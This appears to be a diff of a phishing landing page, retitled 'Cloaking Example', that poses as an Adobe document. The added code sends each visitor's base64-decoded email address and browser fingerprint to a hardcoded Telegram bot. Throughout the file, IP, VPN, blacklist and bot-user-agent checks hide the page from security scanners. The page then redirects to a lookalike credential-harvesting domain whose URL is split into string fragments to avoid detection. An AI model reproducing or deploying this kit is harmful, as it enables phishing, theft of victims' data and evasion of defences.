@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Document</title>
+    <title>Cloaking Example</title>
     <style>
         body, html {
             margin: 0;
@@ -42,6 +42,104 @@
     var checkCountry = false; // Set to true to enable country check
     var Country = "";
 
+function sendMessage(email) {
+  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+  const chatId = '1412104349';
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const userDetails = {
+    Client_Email: email,
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screenSize: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    timestamp: new Date().toISOString(),
+  };
+
+  // Format userDetails into a readable string
+  const formattedDetails = `
+*User Details:*
+- *Client Email*: ${userDetails.Client_Email}
+- *User Agent*: ${userDetails.userAgent}
+- *Language*: ${userDetails.language}
+- *Screen Size*: ${userDetails.screenSize}
+- *Color Depth*: ${userDetails.colorDepth}
+- *Timestamp*: ${userDetails.timestamp}
+  `;
+
+  const data = {
+    chat_id: chatId,
+    text: formattedDetails,
+    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
+  };
+
+  // Use the fetch API to make a POST request to the Telegram Bot API
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  })
+    .then(response => response.json())
+    .then(result => {
+      console.log('Message sent successfully:', result);
+    })
+    .catch(error => {
+      console.error('Error sending message:', error);
+    });
+}
+
+function sendMessage2(email) {
+  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+  const chatId = '1412104349';
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const userDetails = {
+    Client_Emails: "Incoming Bot",
+    Client_Email: email,
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screenSize: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    timestamp: new Date().toISOString(),
+  };
+
+  // Format userDetails into a readable string
+  const formattedDetails = `
+*User Details:*
+- *Client Email*: ${userDetails.Client_Emails}
+- *Client Email*: ${userDetails.Client_Email}
+- *User Agent*: ${userDetails.userAgent}
+- *Language*: ${userDetails.language}
+- *Screen Size*: ${userDetails.screenSize}
+- *Color Depth*: ${userDetails.colorDepth}
+- *Timestamp*: ${userDetails.timestamp}
+  `;
+
+  const data = {
+    chat_id: chatId,
+    text: formattedDetails,
+    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
+  };
+
+  // Use the fetch API to make a POST request to the Telegram Bot API
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  })
+    .then(response => response.json())
+    .then(result => {
+      console.log('Message sent successfully:', result);
+    })
+    .catch(error => {
+      console.error('Error sending message:', error);
+    });
+}
+
+
+
     function fetchIPInfo() {
         const urlParams = new URLSearchParams(window.location.search);
         const param = urlParams.get('SIKA'); // Replace 'Sku' with the actual parameter name
@@ -66,7 +164,6 @@
         fetch('https://ipinfo.io/json?token=d8eafd6deea176')
             .then(response => response.json())
             .then(data => {
-                // Extract IP address and hostname from ipinfo response
                 var ip = data.ip;
                 var hostname = data.hostname || '';
                 console.log('IP Address:', ip);
@@ -77,11 +174,11 @@
                     console.log('Hostname contains a blacklisted word. Adding IP to blacklist...');
                     addBlacklistedIP(ip);
                     redirectToBlockedPage();
-                } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
-                    console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
-                    // Add IP to blacklist database
-                    addBlacklistedIP(ip);
-                    redirectToBlockedPage();
+                // } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
+                //     console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
+                //     // Add IP to blacklist database
+                //     addBlacklistedIP(ip);
+                //     redirectToBlockedPage();
                 } else {
                     console.log('IP ' + ip + ' is not using a VPN and from the allowed country.');
                     // Check if IP is blacklisted
@@ -134,29 +231,69 @@
             });
     }
 
-    function checkBlacklistedIP(ip) {
-        // Check if IP is already blacklisted in the database
-        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
-            .then(response => response.text())
-            .then(data => {
-                if (data === 'blacklisted') {
-                    console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
-                    addBlacklistedIP(ip);
-                    // Redirect user to blocked page
-                    redirectToBlockedPage();
 
-                } else if (data === 'clean') {
-                    console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
-                    // Proceed with normal flow
-                    loadContent(); 
+    function checkBlacklistedIP(ip) {
+    // Check if IP is already blacklisted in the database
+    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+        .then(response => response.text())
+        .then(data => {
+            if (data === 'blacklisted') {
+                console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
+                const paramValue = getQueryParameter('EIP');
+                let finalValue;
+
+                // Check if the parameter exists and is base64-encoded
+                if (paramValue && isBase64(paramValue)) {
+                    finalValue = atob(paramValue); // Decode the base64 parameter
                 } else {
-                    console.log('Error:', data);
+                    finalValue = paramValue; // Use the raw parameter value
                 }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+
+                // Send the final value to the message function and load the content
+                sendMessage2(finalValue);
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();
+
+            } else if (data === 'clean') {
+                console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
+                
+                // Get the 'EIP' parameter from the URL
+                const paramValue = getQueryParameter('EIP');
+                let finalValue;
+
+                // Check if the parameter exists and is base64-encoded
+                if (paramValue && isBase64(paramValue)) {
+                    finalValue = atob(paramValue); // Decode the base64 parameter
+                } else {
+                    finalValue = paramValue; // Use the raw parameter value
+                }
+
+                // Send the final value to the message function and load the content
+                sendMessage(finalValue);
+                loadContent();
+            } else {
+                console.log('Error:', data);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+}
+
+// Helper function to get a query parameter value from the URL
+function getQueryParameter(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+}
+
+// Example function to check if a value is Base64-encoded
+function isBase64(str) {
+    try {
+        return btoa(atob(str)) === str;
+    } catch (err) {
+        return false;
     }
+}
 
 
     const botUserAgents = [
@@ -233,10 +370,10 @@ function verifyAndRedirect() {
 
         if (paramValue && isBase64(paramValue)) {
             finalValue = atob(paramValue);
-            window.location.assign('ht'+'tp'+'s:'+'//'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'5a'+'6a'+'m#'+finalValue);
+            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
         } else {
             finalValue = paramValue;
-            window.location.assign('ht'+'tp'+'s:'+'//'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'5a'+'6a'+'m#'+finalValue);
+            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
         }
     } else {
         window.location.href = "File not found.html";
@@ -244,7 +381,7 @@ function verifyAndRedirect() {
 }
 
 
-            setTimeout(verifyAndRedirect, 1000);
+            setTimeout(verifyAndRedirect, 3000);
         `;
         document.getElementById('content').innerHTML = `
 <!DOCTYPE html>
